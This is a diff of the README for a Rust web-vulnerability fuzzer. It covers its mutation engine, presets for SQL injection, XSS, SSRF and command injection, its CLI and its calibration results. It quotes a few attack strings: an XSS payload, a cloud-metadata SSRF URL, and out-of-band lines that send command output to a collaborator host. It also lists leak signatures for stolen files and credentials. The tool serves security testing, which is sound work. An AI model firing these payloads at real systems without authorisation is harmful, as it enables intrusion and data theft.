@@ -1,291 +1,347 @@
 # fuzzz
 
-A simple fuzzing engine — feed it a target, a vocabulary, and a budget. It mutates, probes, classifies results, and evolves a corpus of promising payloads toward confirmed hits, all from a tiny initial table. Tries to be transport-agnostic, fully deterministic, and built for both batch sweeps and long runs. 
-[citation needed]
-
-## Architecture
+An evolutionary web-fuzzer engine in Rust. Probe payloads are **generated** from an
+atom-chain grammar and **mutated** by a havoc stage, and the blend between the two is
+steered by **response-signal feedback**: anything that produces an interesting response
+is kept in a corpus, given energy, and used as the parent of further probes. The engine
+itself is transport-agnostic — a `Probe` trait is the only thing it needs — fully
+deterministic on replay, and usable both as a library and through a set of CLI runners
+against live targets. It is the fuzzing core of [re:Vise](https://github.com/MamiyaTakuji2005/re-Vise),
+spun out into its own crate.
 
 ```
-atoms → sampler → mutator → loop (signals + feedback) → transport
+seeds / payload table
+        │
+        ▼
+    SeedCorpus ──────► parent payload
+        │                      │
+        │      ┌───────────────┴───────────────┐
+        │      ▼                               ▼
+        │  generation (gen_ratio)        havoc (1 − gen_ratio)
+        │  atoms → ChainTable →         12 stochastic ops ×
+        │  WeightedSampler              ops_per_step
+        │      └────────────┬──────────────┘
+        │                   ▼
+        │          EvolutionaryLoop ──► Probe ──► target
+        │                   │
+        │                   ▼
+        │        classifiers × BaselineProfile
+        │                   │
+        └────── feedback ◄──┘
+          (interesting entries get boosted energy and mutate more)
 ```
 
-### Atoms (`evolutionary/atoms.rs`)
-- 52 web-attack atoms (`'`, `"`, `<`, `{{`, `}}`, ` OR `, ` UNION `, `..`, etc.) plus 18 numeric boundary values
-- `ChainTable` — sparse `(from, to) → f32` weight map. 0.0 = never, 1.0 = default, 20.0 = near-deterministic. Pre-seeded SQL/XSS/template/command chains
-- `PlacementPolicy` — append, prepend, or wrap with weighted probabilities
-- `LengthPolicy` — geometric stop probability. `short()`, `medium()`, `long()`, `fixed(n)`
-
-### Signals (`signals/`)
-- Seven classifiers: Status, Size, BodyDiff, Reflection (literal / percent-encoded / HTML-encoded), TimeDelay, Error (DBMS regex library), BodySignature (per-class leak-content signatures, e.g. `root:x:0:0` / `AccessKeyId` — confirms file-read / SSRF)
-- `BaselineProfile` — captures and filters ambient signals. Variant-specific matching (status class + direction, error family + snippet, magnitude)
-- `Probe` trait — `async fn send(&self, req: &Request) -> Result<ProbeResponse, String>`
-
-### Havoc (`evolutionary/havoc.rs`)
-- 12 operators: InsertToken, ReplaceWithToken, DeleteChunk, DuplicateChunk, SpliceSuffix, UrlEncodeChar, DoubleUrlEncodeChar, InsertBoundaryValue, RepeatPayload, WrapDelimiter, Reverse, Uppercase
-- `HavocSchedule` — per-operator weight table with `pub` fields. Defaults bias toward structural ops (insert/replace/splice ~3.0) over destructive ones (reverse/uppercase ~0.3)
-- All string slicing is UTF-8 safe via `random_char_boundary()`. ASCII payloads take a fast path
-
-### Corpus & Feedback (`evolutionary/corpus.rs`)
-- `SeedCorpus` — entries never removed. Bucket-based power schedule. Payload-to-index dedup
-- `Feedback` trait — `evaluate(&EvaluationContext) -> FeedbackEval`. Receives payload, request, baseline, response, raw & filtered signals, timing
-- `HttpFeedback` — default implementation. Scores signals 0–6. Confirmed on Error, TimeDelay, Reflected(Literal), StatusDelta(≥500)
-
-### Loop (`evolutionary/evolution.rs`)
-- `EvolutionaryLoop<P: Probe>` — blends generation and havoc via `gen_ratio`. Configurable probe budget, timeout, dedup, payload length cap, no-op retry, and RNG backend
-- `EvolutionaryOutcome` — hits, interesting entries, probes sent, corpus size, baseline profile, plus diagnostic counters (errors, timeouts, duplicates/oversized skipped, no-op mutations)
-
-## Payload tables (`payloads.rs`)
-
-Pre-built probe sets for common vulnerability classes. Use as seed corpus:
-
-| Table | Entries | Covers |
-|-------|---------|--------|
-| `SQLI_PAYLOADS` | 68 | error, boolean, UNION, time, stacked |
-| `XSS_PAYLOADS` | 26 | script, img, svg, iframe, attribute |
-| `SSTI_PAYLOADS` | 20 | Jinja2, Thymeleaf, ERB, FreeMarker |
-| `CMD_PAYLOADS` | 24 | pipe, semicolon, backtick, subshell |
-| `PATH_TRAVERSAL_PAYLOADS` | 16 | dot-dot-slash, encoding variants |
-| `XXE_PAYLOADS` | 3 | external entity, OOB |
-| `NOSQLI_PAYLOADS` | 12 | $gt, $ne, $regex, $where |
-| `SSRF_PAYLOADS` | 9 | metadata, localhost, gopher, dict |
-
-## Cheat sheet
-
-| Goal | How |
-|------|-----|
-| Deterministic replay | `.with_seed(42)` |
-| Cross-platform replay | `.with_rng_mode(RngMode::ChaCha12).with_seed(42)` (or `.with_seed(42).with_rng_mode(RngMode::ChaCha12)` — both work) |
-| Only generation | `.with_gen_ratio(1.0)` |
-| Only havoc | `.with_gen_ratio(0.0)` |
-| Freeze corpus | `HttpFeedback { min_corpus_score: 255 }` |
-| Single shot | `.with_max_probes(1).stop_on_first_hit()` |
-| No signals | `SignalSet::new()` |
-| Fixed-length chains | `LengthPolicy::fixed(n)` |
-| Append-only | `PlacementPolicy::append_only()` |
-| Uniform atom choice | `WeightedSampler::uniform()` |
-| One atom only | `atoms = ["X"]` |
-| Custom scoring | `impl Feedback` trait |
-| Custom transport | `impl Probe` trait |
-| Exact table sweep (no mutation) | `Fuzzer::sql_injection().mode(FuzzMode::Table).target("http://x", "GET").run().await` |
-| Exact user inputs (no mutation) | `Fuzzer::sql_injection().mode(FuzzMode::InputsOnly).seeds([...]).run().await` |
-| Cap payload length | `.with_payload_policy(PayloadPolicy::default())` |
-| Disable candidate dedup | `.with_dedup(false)` |
-| Concurrent probes | `.concurrency(8)` or `.with_max_concurrent(8)` |
-| Rate limit (req/s) | `.rate_limit(10.0)` or `.with_probe_interval(Duration::from_millis(100))` |
-
-## Calibration notes
-
-Run via: `cargo run --bin calibrate --release -- targets.toml`
-
-DEFAULT_TRIALS = 20, BASE_SEED = 42, DEFAULT_MAX_PROBES = 300.
-
----
-
-### 1. PlacementPolicy sweep — 5×5 grid + 3 wrap combos
-
-Swept (append, prepend) at [0.0, 0.5, 1.0, 2.0, 4.0] with wrap=0, plus default/wrap/wrap+b.
-
-- Single-digit targets: placement irrelevant (~965–982 all combos).
-- `pair-42`: pure prepend best (908), append (902), default (894). ~14 hit gap.
-- `pair-90`: pure append best (910), prepend (900), default (895). ~10 hit gap.
-- `triple-137`: **wrap-only wins** (868). Default (862). Grid cells cluster at 853–862.
-  Wrap doubles chain length, so 3-atom trigger has more landing chances.
-
-- Against real web targets: placement matters MORE.
-  `cmdi`: append-only smokes prepend-only (974 vs 723). Default (850) in the middle.
-  `sqli`: same pattern, append-only = 951 vs prepend-only = 673. Default = 801.
-  `sqli-strict`: same (913 append vs 703 prepend).
-  `xss`: append-only = 623, prepend-only = 599, default = 602.
-
-Takeaway: append is almost always better than prepend. Default (1.5/1.0/0.5) softens the
-blow by mostly appending anyway. Wrap helps long-chain targets but hurts short-chain ones.
-
----
-
-### 2. ops_per_step sweep — 1, 2, 4, 8, 16
-
-**Monotonic decay: fewer ops = more hits.**
-
-| Target | ops=1 | ops=2 | ops=4 (default) | ops=8 | ops=16 |
-|--------|-------|-------|-----------------|-------|--------|
-| digit-0 | 984 | 978 | 963 | 948 | 940 |
-| digit-3 | 983 | 981 | 975 | 979 | 974 |
-| pair-42 | 947 | 917 | 894 | 865 | 845 |
-| triple-137 | 934 | 897 | 862 | 835 | 797 |
-| sqli | 864 | 843 | 801 | 777 | 720 |
-| xss | 704 | 654 | 602 | 553 | 519 |
-| cmdi | 880 | 866 | 850 | 817 | 774 |
-| ssti | 757 | 731 | 708 | 669 | 655 |
-
-xss-reflected is the ONLY exception: ops=4 (433) > ops=1 (363). Complex XSS vectors
-need more mutation steps to assemble.
-
-Cause: each havoc operator pushes payload further from seed. With 4 ops the candidate
-is so mutated it rarely contains the trigger. With 1 op it stays in the high-signal
-neighbourhood.
-
-Default of 4 is leaving 30–90 hits/1k on the table for most targets.
-
----
-
-### 3. HttpFeedback rank calibration — 8 scoring presets
-
-Tested: default, flat3 (all=3), flat6 (all=6), compressed (1–3), expanded (4–12),
-status>error (swap top 2), bodydiff+ (5), strict (min_corpus_score=4).
-
-| Target | default | flat3 | flat6 | compressed | expanded | status>error | bodydiff+ | strict |
-|--------|---------|-------|-------|-----------|---------|--------------|-----------|--------|
-| cmdi | 850 | 841 | 850 | 843 | 839 | 850 | 850 | 850 |
-| sqli | 801 | 809 | 810 | 811 | 810 | 810 | 801 | 801 |
-| ssti | 708 | 703 | 720 | 710 | 703 | 708 | 708 | 708 |
-| xss | 602 | 609 | 599 | 598 | 595 | 602 | 602 | 602 |
-| xss-reflected | 433 | 438 | 444 | 451 | 444 | 433 | 433 | 433 |
-
-Ranking barely matters. Default vs flat3 vs flat6 are within noise (±10 hits/1k) on
-every target. The hardcoded Error=6 > TimeDelay=5 > Reflected=4 hierarchy provides
-no measurable advantage over flat scoring.
-
-Takeaway: the energy cap at 64 absorbs score differences. Current scoring is fine.
-
----
-
-### 4. min_corpus_score sweep — 1 through 6
-
-Flat at 1–4 for all targets. All firing signals score ≥3–6, so threshold 1 vs 4
-changes nothing. At 5 most targets die (strongest signal is 4 for StatusDelta/Reflected).
-At 6 only sqli-strict survives (has Error=6).
-
-Takeaway: step function gated by signal score. Default of 2 is safe.
-
----
-
-### 5. LengthPolicy internal params — stop_prob + min_atoms
-
-**stop_prob sweep** (min_atoms=1, max=32):
-
-| Target | stop=0.10 | 0.25 (medium) | 0.50 (short) | 0.75 | 0.90 |
-|--------|-----------|--------------|-------------|------|------|
-| sqli | 769 | 827 | 874 | 892 | 897 |
-| xss | 518 | 643 | 711 | 736 | 746 |
-| cmdi | 805 | 873 | 898 | 918 | 928 |
-| ssti | 599 | 738 | 819 | 842 | 855 |
-| xss-refl | 362 | 459 | 527 | 562 | 579 |
-
-Monotonic increase. Higher stop_prob = shorter chains = more hits. Current medium
-preset (0.25) is second-worst. Optimal is 0.90 — chains of 1–2 atoms almost always.
-
-**min_atoms sweep** (stop_prob=0.25, max=32):
-
-| Target | min=1 | min=2 (medium) | min=3 | min=4 (long) |
-|--------|-------|----------------|-------|--------------|
-| sqli | 827 | 812 | 795 | 778 |
-| xss | 643 | 596 | 569 | 524 |
-| cmdi | 873 | 841 | 834 | 804 |
-| ssti | 738 | 703 | 668 | 636 |
-
-Also monotonic: min_atoms=1 always best.
-
-**KEY INSIGHT:** The presets are backwards. `long()` (used by XSS, SSTI, path_traversal
-in agent.rs) is the worst choice for every target. Combined with ops_per_step finding:
-conservative payloads win. Short chains, few mutations, stay close to the seed.
-
----
-
-### 6. Vocab enrichment — per-class atom tables
-
-Tested: xss+ (added `script`, `img`, `svg`, `src=`, `alert(1)` + chains),
-sqli+ (added ` OR `→`1=1`, ` SELECT `→`NULL`, ` AND `→`1=2`),
-ssti+ (added `{{7*'7'}}`, `{{config}}` as single atoms).
-
-Results at gen_ratio=1.0 (pure generation):
-
-| Target | default | xss+ | sqli+ | ssti+ |
-|--------|---------|------|-------|-------|
-| xss | 678 | 655 | 683 | 712 |
-| ssti | 678 | 655 | 683 | 712 |
-| sqli | 841 | 822 | 844 | 846 |
-| sqli-strict | 863 | 843 | 867 | 875 |
-| cmdi | 848 | 828 | 856 | 859 |
-| xss-reflected | 0 | 0 | 0 | 0 |
-| path-traversal | 0 | 0 | 0 | 0 |
-| ssrf | 0 | 0 | 0 | 0 |
-
-Adding atoms HURTS. XSS+ scored WORSE (655 vs 678) — more atoms = lower probability
-of picking useful ones. Vocabulary dilution outweighs chain connectivity.
-
-Adding complete-probe atoms (ssti+) helps slightly (+34 hits/1k) but that's just
-embedding known-good probes into the vocabulary, not generation from fragments.
-
-xss-reflected stays at 0 always. Root cause: mock probe bug in `mock_config.rs:91`
-(split('=').nth(1) truncates at `=`). Not actually about the chain table.
-
-path-traversal + ssrf stay at 0 always. Root cause: SizeDelta min_abs=50 is too
-high for their small mock trigger bodies — see item 9.
-
-**Takeaway:** Shared atom table is actively harmful. Each vulnerability class should
-have its own focused atom vocabulary. The architecture already supports this via
-`WeightedSampler::from_proto_config()`. Currently all agent.rs presets use the full
-ATOMS table — they shouldn't.
-
----
-
-### 7. Energy boost mechanism — BoostMode
-
-Not yet calibrated. BoostMode enum added to SeedCorpus:
-- `None` — no energy growth (pure exploration)
-- `Additive` — energy += score (current)
-- `Flat` — energy += 1 regardless of signal
-- `Multiplicative` — energy *= (6+score)/6 (exponential)
-
----
-
-### 8. Individual HavocOp ablation
-
-Not yet done.
-
----
-
-### 9. Signal classifier thresholds
-
-Not yet done. Known issue: SizeClassifier `min_abs=50` is too high for small mock
-trigger bodies. path-traversal body is 33 bytes, ssrf body is 12 bytes — both below
-threshold, so no signal fires, so the engine can never confirm these targets regardless
-of how good the payload is.
-
----
-
-### 10. Atom dead-weight audit
-
-Not yet done.
-
----
-
-### Old calibrated defaults (v0.2, pre-audit)
-
-These are from the old 3-phase sweep. Most values are now known to be suboptimal:
-
-| Preset | gen_ratio | LengthPolicy | Notes |
-|--------|-----------|-------------|-------|
-| `sql_injection` | 0.8 | medium | — |
-| `xss` | 0.8 | **long** | Should be short or stop=0.75 |
-| `ssti` | 0.8 | **long** | Should be short — long actively hurts |
-| `command_injection` | 0.7 | short | OK |
-| `path_traversal` | 0.7 | **long** | Should be short |
-| `nosql_injection` | 0.7 | short | OK |
-| `ssrf` | 0.0 | medium | OK (pure havoc anyway) |
-| `xxe` | 0.0 | medium | OK (pure havoc anyway) |
-
-Also: `ops_per_step` should be 1 or 2, not 4. And all presets should use focused
-atom tables instead of the full ATOMS.
-
----
-
-### Mock probe bug
-
-`src/mock_config.rs:91`: `req.url.split('?').nth(1).split('=').nth(1)` truncates
-payload at the second `=` sign. Candidate `<img src=x onerror=alert(1)>` extracts
-as `<img src`. The trigger check still matches `<img`, but the response body only
-reflects the truncated version, so ReflectionClassifier compares full candidate
-against truncated body → no match.
-
-This makes xss-reflected untestable with the current mock probe.
+## The pieces
+
+**`evolutionary/atoms.rs`** is the vocabulary and the grammar. 46 web-attack atoms —
+SQL quotes and keywords, XSS brackets, template delimiters, command-injection
+characters, traversal sequences, encoding primitives — plus 20 numeric atoms for
+parameter fuzzing. `ChainTable` is a sparse `(from, to) → weight` map; missing pairs
+default to 1.0, and `compile()` precomputes cumulative distributions so sampling from
+`WeightedSampler` is allocation-free. `PlacementPolicy` decides where a generated chain
+lands (append / prepend / wrap) and `LengthPolicy` stops it with a geometric
+probability (`short`, `medium`, `long`, `fixed(n)`).
+
+**`evolutionary/havoc.rs`** is the mutation stage: 12 stochastic operators (insert,
+replace, delete, duplicate, splice, URL-encode, boundary-value insert, repeat, wrap,
+reverse, uppercase), each with a public weight in `HavocSchedule`. The defaults are
+calibrated — `ops_per_step` is 1 so a candidate stays near its seed, replacing tokens is
+down-weighted (it pushes payloads off their trigger) and repeating payloads is
+up-weighted (it keeps the trigger intact). All string slicing is UTF-8 safe.
+
+**`evolutionary/corpus.rs`** is the memory of what worked. `SeedCorpus` never removes
+entries; each entry carries an energy score (cap 64) and is drawn as a mutation parent
+proportional to it, so a payload that fired a signal keeps spawning children. Energy
+growth is a `BoostMode`: additive (default), flat, multiplicative, or none. Feedback
+comes through a `Feedback` trait; the built-in `HttpFeedback` scores signals 0–6 and
+*confirms* a hit on DBMS errors, leak signatures, time delays, literal reflection, a
+≥500 status delta, or a prototype-pollution gadget.
+
+**`signals/`** turns raw responses into statements. The classifiers in
+`signal.rs` cover status, size, reflection (literal / percent-encoded / HTML-encoded),
+time-delay, body-diff, DBMS and Node error families, per-class body signatures
+(`root:x:0:0` for file read, `AccessKeyId` for cloud metadata), the json-spaces
+prototype-pollution gadget, and a novelty/anomaly fingerprint. `baseline.rs` runs a
+`BaselineProfile`: an empty-payload request first, whose ambient signals are filtered
+out of every probe result, with variant-specific matching (status class + direction,
+error family + snippet, magnitude) rather than "any difference counts".
+
+**`evolutionary/evolution.rs`** is the loop that spends the budget: per probe it blends
+generation and havoc according to `gen_ratio` (0.0 = pure mutation, 1.0 = pure
+generation, 0.7 default), with configurable timeout, dedup, payload-length cap, and
+no-op retries. The RNG is dual-mode (`rng.rs`): `SmallRng` for throughput, and
+`ChaCha12Rng` — stable across platforms and toolchain versions — for replay; a seed
+fixes the stream either way.
+
+**`agent.rs`** is the high-level public API: a `Fuzzer<P: Probe>` builder that combines
+a vulnerability preset, a `FuzzMode`, an injection point, and a transport, then runs and
+returns `FuzzResult` with hits and diagnostics. The `fuzz` CLI is a thin wrapper around
+it; a custom `Probe` is all you need to fuzz anything that isn't HTTP.
+
+## Presets & payloads
+
+Nine vulnerability presets, each with its own curated payload corpus, focused grammar,
+and detector set. The corpora live as `payload_data/*.json` (~600 payloads total) with
+per-payload metadata — context, encoding, severity, target technologies, description —
+that carries through to results:
+
+| `class` | preset | payloads | corpus covers |
+|---------|--------|---------:|---------------|
+| `sqli` | SQL injection | 112 | error / boolean / UNION / time / stacked, per DBMS |
+| `xss` | cross-site scripting | 80 | script, img, svg, iframe, attribute contexts |
+| `ssti` | template injection | 61 | Jinja2, Thymeleaf, ERB, FreeMarker, … |
+| `cmdi` | command injection | 69 | pipe, semicolon, backtick, subshell, OOB |
+| `path` | path traversal | 61 | dot-dot-slash and encoding variants |
+| `nosql` | NoSQL injection | 86 | MongoDB `$gt` / `$ne` / `$regex` / `$where`, … |
+| `ssrf` | server-side request forgery | 56 | cloud metadata, localhost, loopback bypasses, OOB |
+| `xxe` | XML external entities | 31 | inline + OOB exfil |
+| `proto` | prototype pollution | 45 | detection gadgets (not blind pollution) |
+
+Presets are thin on purpose: they pair a table, an atom grammar, a signal set, and a
+`gen_ratio`. The ratios are calibrated per class — `sqli`/`xss`/`ssti` run hot at 0.8,
+`cmdi`/`path`/`nosql` at 0.7, while `ssrf` and `xxe` are *pure havoc* (0.0): generation
+doesn't help when the payload is a URL or a structured XML document. The default
+`gen_ratio` of 0.7 is the safe middle.
+
+`FuzzMode` decides *how* the budget is spent: `Table` walks the payload table once with
+no randomness (predictable first-pass coverage), `TableThenEvolutionary` sweeps the
+table and then evolves from whatever was interesting, `Evolutionary` is pure
+corpus-driven search (default), and `InputsOnly` fires exactly the payloads you gave it.
+
+## Quick start
+
+The `fuzz` CLI is the fastest path to a live target — a preset, a URL, an injection
+point, and a budget:
+
+```
+cargo run --bin fuzz --features http --release -- \
+    --preset sqli --url 'https://target/item.php' --inject-query id --budget 300
+```
+
+As a library, the same run is one builder chain — `HttpProbe` is the real-HTTP
+transport behind the `http` feature; anything implementing `Probe` works, mock or real:
+
+```rust
+use std::sync::Arc;
+use std::time::Duration;
+use fuzzz::agent::{Fuzzer, FuzzMode};
+use fuzzz::http::HttpProbe; // behind the `http` feature — or implement Probe yourself
+
+let probe = Arc::new(HttpProbe::new(Duration::from_secs(15)));
+let result = Fuzzer::new(probe)
+    .sql_injection()
+    .mode(FuzzMode::Evolutionary)
+    .target("https://target/item.php?id=1", "GET")
+    .inject_query("id")
+    .budget(300)
+    .replay_seed(42)          // deterministic replay
+    .run().await?;
+
+println!("confirmed: {:?}", result.confirmed);
+```
+
+For the low-level engine (your own atoms, chains, feedback, and transport), the
+`digits` example is a complete annotated walkthrough: a mock target hiding "42" and "7"
+inside a digit vocabulary, discovered by pure generation in 30 probes.
+
+```
+cargo run --example digits
+```
+
+## The `fuzz` CLI
+
+A headless single-URL runner. Its report is mechanics-first — baseline profile, probes
+sent, every signal observed (confirmed or merely interesting) — so the
+request → baseline-diff → classify pipeline stays visible even when nothing confirms.
+Run `cargo run --bin fuzz --features http -- --help` for the full grouped help; the
+shape is:
+
+```
+fuzz --preset <class|path> --url <URL> [options]
+
+  --preset <class|path>    Built-in class (sqli xss ssti cmdi path nosql ssrf xxe proto)
+                           or a path to an external module .json — see below.
+  --inject-query <param>   Inject {{payload}} into a query parameter.
+  --inject-body <tmpl>     …or a form-body template containing {{payload}}.
+  --inject-body-file <p>   …same, read from a file (preserves trailing newlines —
+                           NDJSON _bulk-style bodies need this).
+  --inject-json            …or the payload IS the whole application/json body.
+  --budget <n>             Probe budget (default 100).
+  --mode <m>               evolutionary | table | table-then-evo | inputs-only.
+  --concurrency <n>        In-flight probes (default 1); --rate-limit <rps> caps it.
+  --seed <u64>             Fix the RNG for deterministic replay.
+  --hunt                   Recall-first: also flag responses unlike the baseline.
+  --jsonl                  One JSON object per hit on stdout — pipe into jq.
+  --header / --cookie      Session flags carried into EVERY request, baseline included.
+  --csrf-url <URL>         Refresh a CSRF token per request (cookie store on).
+  --oob-url <collab>       OOB collaborator for {{oob}} payloads.
+```
+
+The injection flags are mutually exclusive; if several are present the precedence is
+JSON body → body template → query. `--header` is repeatable and, with `--cookie`, gets
+you behind logins (DVWA-style). `--jsonl` keeps stdout machine-readable for piping into
+jq or a spider loop that maps endpoints → fuzzes each → collects the findings.
+
+## One campaign, one file: module presets
+
+`--preset` is dual-purpose: a known class name selects the compiled-in preset, anything
+else is a path to a module `.json`. A module is a **diff over a base class**: it names a
+`class` (which supplies detectors, feedback, and any section the file omits) and then
+overrides the data half — `grammar` (`atoms`, `chain`, `placement`, `length`),
+`payloads`, `gen_ratio`, `shells`. "My seeds but the hardcoded atoms" is just an omitted
+`grammar` section. Grammar and payloads stay separate sections in one file so either can
+be dropped without inventing a second format:
+
+```json
+{
+  "class": "ssrf",
+  "name": "ssrf-cloud-metadata",
+  "description": "SSRF sweep tuned for cloud metadata endpoints and loopback bypasses.",
+  "signals": ["status", "body-signature:cloud"],
+  "grammar": {
+    "atoms": ["http://", "169.254.169.254", "metadata", "%2e", "…"],
+    "chain": { "metadata": { "/latest/": 3.0 } }
+  },
+  "payloads": [ { "value": "http://169.254.169.254/latest/meta-data/", "…": "…" } ]
+}
+```
+
+A non-empty `signals` array makes the module **self-contained** — it names its own
+detectors, resolved by name through the registry (`status`, `size`, `reflection`,
+`time-delay`, `body-diff`, `proto-pollution`, `error:dbms`, `error:nodejs`,
+`body-signature:file`, `body-signature:cloud`, `novelty`) and replaces the class's set.
+Omit it to inherit. Feedback still comes from the base class. `examples/ssrf-cloud-metadata.json`
+is a worked example — and a class name shadows a same-named file, so `./name.json`
+forces the file.
+
+## Out-of-band payloads: `{{oob}}`
+
+Payloads that need a callback — blind command injection, OOB XXE, SSRF, DNS exfil —
+carry the placeholder `{{oob}}`, which is a **bare host**, not a URL: the payload writes
+its own scheme (`curl http://{{oob}}/…`, `nslookup $(whoami).{{oob}}`). Supply the
+collaborator with `--oob-url <url-or-host>` (the `{{interactsh-url}}` alias is accepted)
+and it is substituted at injection time. Without it, OOB payloads are skipped and
+reported to stderr — never sent as dead probes. The placeholder is a host rather than a
+URL so one collaborator value works across payloads that disagree about their scheme and
+path.
+
+## The GUI workbench: `fuzz-gui`
+
+`fuzz-gui` (`--features gui`) is the interactive side: all nine presets, the four fuzz
+modes, the injection points, per-request timeout, an OOB collaborator field, and
+stop-on-first-hit, with progress reporting and cancellation. It drives the same
+`Fuzzer` builder the CLI does.
+
+> **Prototype pollution is invasive.** The `proto` preset confirms with detection
+> gadgets rather than blind pollution — the json-spaces gadget makes a vulnerable app's
+> response JSON re-indent, which the classifier catches as a whitespace-only diff. A
+> successful gadget pollutes the live application persistently until it restarts. Treat
+> a PP run as you would a destructive payload.
+
+## Recall-first hunting
+
+Fuzzing for signatures is precision-first: you only find what you know to look for.
+`--hunt` (or `Fuzzer::hunt()`) bolts on `NoveltyClassifier`, which fingerprints every
+response as `(status, size, words, lines)` and flags anything unlike the baseline as an
+*anomaly* — reported, never confirmed. It surfaces unusual responses even when no
+vulnerability signature matches. The design rationale — why this engine deliberately
+wants recall where ffuf-style tools want precision — is written up in
+[`ANOMALY.md`](ANOMALY.md), with the recall-first comments in `signal.rs`,
+`baseline.rs`, `corpus.rs`, and `bin/fuzz.rs` pointing back to it.
+
+## Determinism & concurrency
+
+A run is a function of (seed, concurrency). `--seed <u64>` fixes the RNG stream: the
+same seed and the same `--concurrency` reproduce the same candidate sequence, and
+`--concurrency 1` is bit-exact sequential replay on a given build. For replay that is
+stable across platforms and toolchain versions, opt into `ChaCha12` at the engine level
+(`EvolutionaryLoop::with_rng_mode`) — a seed with the default `SmallRng` is
+deterministic only for the same rand version. The sweeps and the regression test lean
+on this to keep calibration numbers reproducible.
+
+The real HTTP transport opens a **fresh connection per probe** by default: fuzzing
+benefits from the target not being able to serialize all probes down one persistent
+pipe. Targets that throttle connection churn, or that need session state across probes,
+can opt into keepalive via the `keepalive` feature.
+
+## Calibration
+
+The engine is tuned against offline mock targets — TOML-described servers in
+`targets.toml` (`sqli`, `xss`, `cmdi`, `ssti`, `sqli-strict`, `xss-reflected`, `ssrf`,
+`path-traversal`, plus a `waf-blocked` negative control) — so every knob is swept on
+deterministic, network-free runs:
+
+```
+cargo run --bin calibrate --release -- targets.toml
+```
+
+The sweeps settled on: **conservative payloads win** — short chains and few mutation
+ops stay in the high-signal neighborhood of a good seed, append beats prepend, and a
+shared giant atom table actively hurts (each class gets a focused grammar instead of
+the full vocabulary). Three mock-harness bugs had been hiding real engine behavior —
+payload truncation at `=`, and leak-based classes (path traversal, SSRF) whose mock
+bodies were too small for the size classifier to fire; the first is fixed, the second by
+leak-body mocks plus the `BodySignatureClassifier`, and all three formerly-zero targets
+now confirm roughly nine probes in ten. `tests/calibration.rs` is the regression guard:
+it replays every target at fixed seeds and fails the build if a target falls below its
+hit-rate floor or `waf-blocked` ever fires.
+
+## Repo layout
+
+The crate root is `Cargo.toml`; run cargo from the repo root.
+
+* `src/agent.rs` — `Fuzzer` builder: presets, modes, injection points (main public API).
+* `src/evolutionary/` — the engine: `atoms.rs`, `havoc.rs`, `corpus.rs`, `evolution.rs`, `rng.rs`.
+* `src/signals/` — classifiers (`signal.rs`), the name→classifier registry, the signal-guided mutator.
+* `src/baseline.rs` — ambient-signal filtering (the null hypothesis).
+* `src/payloads.rs` + `src/payload_data/*.json` — the curated corpus (~600 payloads).
+* `src/module.rs` — external module-file schema.
+* `src/mock_config.rs` — TOML mock targets for offline calibration.
+* `src/http.rs` — real HTTP transport behind the `http` feature (reqwest).
+* `src/bin/` — the CLIs, see below.
+* `examples/` — `digits.rs` (engine walkthrough), `ssrf-cloud-metadata.json` (module example).
+* `tests/calibration.rs` — deterministic calibration regression guard.
+
+| binary | feature | what it is |
+|--------|---------|------------|
+| `fuzz` | `http` | headless single-URL runner against a live target |
+| `fuzz-gui` | `gui` | interactive egui workbench over the same builder |
+| `calibrate` | — | full calibration sweep over `targets.toml`, hits per 1k |
+| `stress` | — | extended stress suite over `stress_targets.toml` |
+| `sweep` | — | corpus-size × vocabulary-size grid, CSV output |
+| `signal_sweep` | — | does each preset's detector set actually fire on its target? |
+| `atom_audit` | — | which atoms never make it into generated payloads |
+| `cap_sweep` | — | energy-cap sweep |
+| `havoc_ablation` | — | zero each havoc op in turn, measure the hit delta |
+| `bench` | — | speed benchmark (quiet / noisy / heavy targets) |
+| `report` | — | throughput, discovery, waste, and replay report suite |
+
+## Build & test
+
+```
+cargo check                              # type-check (fast)
+cargo test                               # unit tests + calibration regression guard
+cargo test --test calibration -- --nocapture   # per-target hit rates (deterministic)
+cargo run --bin calibrate --release -- targets.toml   # full calibration sweep
+cargo run --bin fuzz --features http --release -- --help
+cargo run --bin fuzz-gui --features gui --release
+cargo run --bin report --release         # benchmark & report suite
+```
+
+The crate builds clean with no features — the engine, mock probes, and calibration all
+run offline. Features add transport on top: `http` (reqwest, powers `fuzz`), `keepalive`
+(connection reuse for session-y targets), and `gui` (egui, powers `fuzz-gui`). The
+release profile is size-optimized (`opt-level = "z"`, LTO, one codegen unit, stripped).
+
+## License & attribution
+
+MIT — see `Cargo.toml`. No `LICENSE` file yet; the copyright line is still "re:Vise
+Team" from the extraction.
+
+**On the name.** The engine began inside
+[re:Vise](https://github.com/MamiyaTakuji2005/re-Vise), where it evolved payloads
+against a live-target harness; the engine itself was transport-independent and worth
+having on its own. It was extracted into this crate under the working name
+`auto-fuzz` — the name you still see on local checkouts and older calibration notes —
+and renamed `fuzzz` when it got its own repository. Old notes that say `auto-fuzz`
+mean this crate.
